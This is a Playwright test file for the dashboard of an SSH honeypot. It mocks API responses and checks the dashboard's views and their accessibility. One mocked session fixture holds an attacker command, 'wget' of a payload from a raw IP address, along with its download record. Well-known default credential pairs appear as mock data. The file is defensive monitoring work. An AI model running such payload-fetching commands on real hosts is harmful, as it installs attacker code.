import { test, expect, type Page } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

// The dashboard talks to the API; in CI/preview there is no backend, so we
// stub /api/v1/** with deterministic fixtures. This keeps the e2e hermetic
// (no docker stack) while letting the data-heavy views render real content for
// the accessibility scan.

async function mockApi(page: Page): Promise<void> {
  await page.route('**/api/v1/**', async (route) => {
    const path = new URL(route.request().url()).pathname
    const json = (body: unknown) =>
      route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(body),
      })

    if (path.endsWith('/stats/totals'))
      return json({ total_sessions: 42, total_auth_attempts: 99, unique_ips: 7 })
    if (path.endsWith('/stats/trend'))
      return json({ current: 42, previous: 30, delta: 12, pct_change: 40 })
    if (path.endsWith('/stats/top-passwords'))
      return json([
        { password: '123456', count: 10 },
        { password: 'root', count: 5 },
      ])
    if (path.endsWith('/stats/top-countries'))
      return json([{ country_code: 'US', country: 'United States', count: 8 }])
    if (path.endsWith('/stats/countries'))
      return json({
        countries: [
          {
            country_code: 'CN',
            country: 'China',
            sessions: 1200,
            distinct_ips: 50,
            attempts: 5000,
            successful: 6,
            success_rate: 0.12,
            distinct_usernames: 30,
            distinct_passwords: 96,
          },
          {
            country_code: 'US',
            country: 'United States',
            sessions: 400,
            distinct_ips: 200,
            attempts: 900,
            successful: 12,
            success_rate: 1.33,
            distinct_usernames: 18,
            distinct_passwords: 60,
          },
          {
            country_code: '??',
            country: 'Unknown',
            sessions: 80,
            distinct_ips: 40,
            attempts: 120,
            successful: 0,
            success_rate: 0,
            distinct_usernames: 5,
            distinct_passwords: 10,
          },
        ],
        total_countries: 2,
        geo_resolved_pct: 81.3,
      })
    if (path.endsWith('/stats/asns'))
      return json([
        { asn: 16276, as_org: 'OVH SAS', sessions: 88, distinct_ips: 12 },
        { asn: 4837, as_org: 'China Unicom', sessions: 40, distinct_ips: 8 },
      ])
    if (path.endsWith('/stats/activity'))
      return json([
        { bucket: '2026-05-29T00:00:00+00:00', count: 4 },
        { bucket: '2026-05-30T00:00:00+00:00', count: 9 },
        { bucket: '2026-05-31T00:00:00+00:00', count: 6 },
      ])
    if (path.endsWith('/stats/heatmap'))
      return json([
        { weekday: 0, hour: 13, count: 7 }, // Sunday cell (0=Sun)
        { weekday: 2, hour: 14, count: 12 },
      ])
    if (path.endsWith('/stats/top-credentials')) {
      const q = new URL(route.request().url()).searchParams
      if (q.get('outcome') === 'success')
        return json([{ username: 'root', password: 'toor', count: 3, distinct_ips: null }])
      if (q.get('metric') === 'ip_fanout')
        return json([
          { username: 'root', password: 'xc3511', count: 400, distinct_ips: 37 },
          { username: 'admin', password: 'admin', count: 120, distinct_ips: 1 },
        ])
      if (q.get('by') === 'password')
        return json([
          { username: null, password: 'hunter2', count: 64, distinct_ips: null },
          { username: null, password: '123456', count: 30, distinct_ips: null },
        ])
      if (q.get('by') === 'username')
        return json([
          { username: 'root', password: null, count: 220, distinct_ips: null },
          { username: 'admin', password: null, count: 90, distinct_ips: null },
        ])
      return json([
        { username: 'root', password: '123456', count: 140, distinct_ips: null },
        { username: 'admin', password: 'admin', count: 90, distinct_ips: null },
      ])
    }
    if (path.endsWith('/stats/auth-outcomes'))
      return json({
        total: 99,
        successful: 4,
        failed: 95,
        success_rate: 4.04,
        unique_passwords: 61,
        unique_usernames: 18,
      })
    if (path.endsWith('/stats/password-composition'))
      return json({
        total: 99,
        capped_at: 16,
        lengths: [
          { length: 4, count: 10 },
          { length: 6, count: 40 },
          { length: 8, count: 20 },
          { length: 16, count: 5 },
        ],
        classes: [
          { name: 'digits', count: 50 },
          { name: 'lower', count: 30 },
          { name: 'alnum', count: 19 },
        ],
      })
    if (path.endsWith('/stats/passwords-by-length'))
      return json([
        { password: '123456', count: 12 },
        { password: 'qwerty', count: 4 },
      ])
    // List has a trailing slash (/sessions/); the detail route does not.
    if (path.endsWith('/sessions/'))
      return json({
        items: [
          {
            id: '726faaebd6b9',
            src_port: 45214,
            dst_port: 2222,
            protocol: 'ssh',
            country: 'United States',
            country_code: 'US',
            started_at: '2026-05-31T13:40:52+00:00',
            ended_at: '2026-05-31T13:41:50+00:00',
            auth_attempt_count: 1,
            command_count: 2,
            has_successful_login: true,
            category: 'active',
          },
        ],
        meta: { page: 1, pages: 1, per_page: 25, total: 1 },
      })
    const sessionMatch = path.match(/\/sessions\/([^/]+)$/)
    if (sessionMatch)
      return json({
        id: sessionMatch[1],
        src_port: 45214,
        dst_port: 2222,
        protocol: 'ssh',
        sensor: 'edge-01',
        country: 'United States',
        country_code: 'US',
        started_at: '2026-05-31T13:40:52+00:00',
        ended_at: '2026-05-31T13:41:50+00:00',
        auth_attempts: [
          {
            id: 1,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:38+00:00',
          },
        ],
        commands: [
          { id: 10, input: 'whoami', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
          {
            id: 11,
            input: 'wget http://34.11.136.102/meow',
            success: true,
            timestamp: '2026-05-31T13:41:49+00:00',
          },
        ],
        downloads: [
          {
            id: 1,
            url: 'http://34.11.136.102/meow',
            outfile: 'downloads/x',
            sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
            timestamp: '2026-05-31T13:41:51+00:00',
          },
        ],
      })

    return route.fulfill({
      status: 404,
      contentType: 'application/json',
      body: '{"code":404,"status":"Not Found","message":"Not Found"}',
    })
  })
}

async function expectAxeClean(page: Page): Promise<void> {
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
    .analyze()
  // Map to rule ids for a readable failure message instead of a giant object.
  expect(results.violations.map((v) => v.id)).toEqual([])
}

test.describe('dashboard accessibility smoke', () => {
  test.beforeEach(async ({ page }) => {
    await mockApi(page)
  })

  test('overview renders data and is axe-clean', async ({ page }) => {
    await page.goto('/')
    await expect(page.getByRole('heading', { level: 1, name: 'Overview' })).toBeVisible()
    await expect(page.getByText('Top passwords')).toBeVisible()
    await expectAxeClean(page)
  })

  test('credentials renders the leaderboard, toggles lenses, axe-clean', async ({ page }) => {
    await page.goto('/credentials')
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Top credentials' })).toBeVisible()
    // Hero pair row (username + ":password" rendered together).
    await expect(page.getByText('root:123456')).toBeVisible()
    // Accepted-credentials mini list from the success-filtered query.
    await expect(page.getByText('root:toor')).toBeVisible()

    // Switching to the IP fan-out lens re-ranks by distinct source IPs.
    await page.getByRole('button', { name: 'IP fan-out' }).click()
    await expect(page.getByText('37 IPs')).toBeVisible()

    // The Passwords lens lists raw passwords (no username).
    await page.getByRole('button', { name: 'Passwords', exact: true }).click()
    await expect(page.getByText('hunter2')).toBeVisible()

    // Clicking a length bar swaps the whole card into a scrollable password
    // list with a back button (no in-place reflow).
    await page.getByRole('button', { name: /6 characters/ }).click()
    await expect(page.getByText('123456')).toBeVisible()
    const back = page.getByRole('button', { name: /Composition/ })
    await expect(back).toBeVisible()
    // The hover tooltip must not survive the view swap (it used to freeze on
    // the graph at the click point).
    await expect(page.getByRole('tooltip')).toHaveCount(0)

    await expectAxeClean(page)

    // Back returns to the histogram (the length bars reappear).
    await back.click()
    await expect(page.getByRole('button', { name: /6 characters/ })).toBeVisible()
  })

  test('countries: master-detail leaderboard drills into a country, axe-clean', async ({
    page,
  }) => {
    await page.goto('/countries')
    await expect(page.getByRole('heading', { level: 1, name: 'Countries' })).toBeVisible()

    // Leaderboard rows (China ranks first by sessions).
    await expect(page.getByRole('button', { name: /China/ })).toBeVisible()
    await expect(page.getByRole('button', { name: /United States/ })).toBeVisible()

    // The #1 country is auto-selected, so the detail panel paints without a
    // click: its passwords (by=password mock) and top network are visible.
    await expect(page.getByRole('heading', { level: 2, name: 'China' })).toBeVisible()
    await expect(page.getByText('hunter2')).toBeVisible()
    await expect(page.getByText('OVH SAS')).toBeVisible()

    // Selecting another country drives the URL and swaps the detail.
    await page.getByRole('button', { name: /United States/ }).click()
    await expect(page).toHaveURL(/country=US/)
    await expect(page.getByRole('heading', { level: 2, name: 'United States' })).toBeVisible()

    // The geo-less "Unknown" bucket is drillable too (?? sentinel), surfacing
    // its credentials like any country.
    await page.getByRole('button', { name: /Unknown/ }).click()
    await expect(page).toHaveURL(/country=(\?\?|%3F%3F)/)
    await expect(page.getByRole('heading', { level: 2, name: 'Unknown' })).toBeVisible()
    await expect(page.getByText('hunter2')).toBeVisible()

    // Re-ranking by a different metric is URL-driven (the sort control is a
    // radiogroup: single-select among the ranking axes).
    await page.getByRole('radio', { name: 'Unique IPs' }).click()
    await expect(page).toHaveURL(/sort=ips/)

    await expectAxeClean(page)
  })

  test('countries: mobile collapses to drill navigation (list -> detail -> back)', async ({
    page,
  }) => {
    await page.setViewportSize({ width: 390, height: 780 })
    await page.goto('/countries')

    // List view: the leaderboard is visible, the detail back-affordance is not.
    await expect(page.getByRole('button', { name: /China/ })).toBeVisible()
    const back = page.getByRole('button', { name: /^Countries$/ })
    await expect(back).toBeHidden()

    // Tapping a country drills into its detail; the leaderboard row is gone and
    // the back button + breakdown are shown.
    await page.getByRole('button', { name: /China/ }).click()
    await expect(page).toHaveURL(/country=CN/)
    await expect(back).toBeVisible()
    await expect(page.getByText('OVH SAS')).toBeVisible()
    await expect(page.getByRole('button', { name: /United States/ })).toBeHidden()

    await expectAxeClean(page)

    // Back returns to the list.
    await back.click()
    await expect(page).not.toHaveURL(/country=/)
    await expect(page.getByRole('button', { name: /United States/ })).toBeVisible()
  })

  test('overview map drills into the countries page', async ({ page }) => {
    await page.goto('/')
    // The map's offscreen accessible list exposes a drill button per attacked
    // country (US in the top-countries mock -> count 8). It is visually clipped
    // (the SVG paths are the mouse target), so exercise the keyboard path it
    // exists for: focus + Enter.
    const drill = page.getByRole('button', { name: /United States/ })
    await drill.focus()
    await page.keyboard.press('Enter')
    await expect(page).toHaveURL(/\/countries\?country=US/)
  })

  test('not-found renders and is axe-clean', async ({ page }) => {
    await page.goto('/this-route-does-not-exist')
    await expect(page.getByRole('heading', { level: 1, name: 'Route not found' })).toBeVisible()
    await expectAxeClean(page)
  })

  test('activity renders the heatmap and filters by country, axe-clean', async ({ page }) => {
    await page.goto('/activity')
    await expect(page.getByRole('heading', { level: 1, name: 'Activity' })).toBeVisible()
    await expect(page.getByRole('img', { name: /heatmap/i })).toBeVisible()

    // Country scope is a custom dropdown shared with Sessions.
    await page.getByRole('button', { name: /Country/ }).click()
    await page.getByRole('option', { name: 'United States' }).click()
    await expect(page).toHaveURL(/country=US/)

    await expectAxeClean(page)
  })

  test('sessions list opens a terminal replay with IPs blotted, axe-clean', async ({ page }) => {
    await page.goto('/sessions')
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
    await expectAxeClean(page)

    await page.getByRole('link', { name: /726faaebd6b9/ }).click()
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9/)

    const term = page.getByRole('region', { name: /terminal replay/i })
    await expect(term).toBeVisible()
    await expect(term).toContainText('whoami')
    await expect(term).toContainText('‹ip›')
    await expect(term).not.toContainText('34.11.136.102')
    // Command lines carry the capture time in the gutter (HH:MM:SS UTC).
    await expect(term).toContainText('13:41:49')

    // The Sessions nav tab stays active on the detail route (exact name so the
    // "← All sessions" back-link doesn't also match).
    await expect(page.getByRole('link', { name: 'Sessions', exact: true })).toHaveClass(
      /nav-link-active/,
    )
    await expectAxeClean(page)
  })

  test('sessions filters render badges and drive the URL, axe-clean', async ({ page }) => {
    await page.goto('/sessions')
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()

    // Classification badge (the mocked session ran commands -> "CLI"). The badge
    // renders in both the table and the (desktop-hidden) mobile card list, so
    // target the first/visible one.
    await expect(page.getByText('CLI', { exact: true }).first()).toBeVisible()

    // Filters are custom dropdowns, URL-driven.
    await page.getByRole('button', { name: /^Show/ }).click()
    await page.getByRole('option', { name: 'CLI' }).click()
    await expect(page).toHaveURL(/category=active/)

    await page.getByRole('button', { name: /^Sort/ }).click()
    await page.getByRole('option', { name: 'Country A–Z' }).click()
    await expect(page).toHaveURL(/sort=country/)

    await expectAxeClean(page)
  })

  test('a failed sessions load shows the error boundary and recovers', async ({ page }) => {
    // Override the list endpoint with a 500 (LIFO: this handler wins over the
    // beforeEach mock). The view awaits suspense, so the rejection bubbles to the
    // App-level ErrorBoundary outside <Suspense>.
    let fail = true
    // Regex (not glob) so the query-string list URL (/sessions/?page=...) matches
    // but the detail route (/sessions/<id>) does not.
    await page.route(/\/api\/v1\/sessions\/(\?|$)/, async (route) => {
      if (fail)
        return route.fulfill({
          status: 500,
          contentType: 'application/json',
          body: '{"code":500,"status":"Internal Server Error","message":"boom"}',
        })
      return route.fallback()
    })

    await page.goto('/sessions')
    // The list query retries 5xx twice with backoff before the boundary catches.
    const alert = page.getByRole('alert')
    await expect(alert).toBeVisible({ timeout: 15_000 })
    await expect(alert).toContainText('Something went wrong')

    // "Try again" resets the query and refetches; lift the failure first.
    fail = false
    await alert.getByRole('button', { name: 'Try again' }).click()
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
  })
})
